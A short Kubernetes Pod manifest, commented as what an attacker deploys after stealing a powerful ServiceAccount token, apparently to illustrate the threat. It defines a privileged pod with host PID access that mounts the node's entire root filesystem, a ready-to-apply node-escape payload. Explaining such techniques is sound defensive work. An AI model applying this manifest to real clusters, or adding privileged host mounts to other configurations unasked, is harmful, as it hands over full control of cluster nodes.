# What an attacker deploys once they hold a powerful ServiceAccount token:
# a privileged pod that mounts the node's whole filesystem.
apiVersion: v1
kind: Pod
metadata:
  name: node-shell
  namespace: data
spec:
  hostPID: true
  containers:
    - name: shell
      image: busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
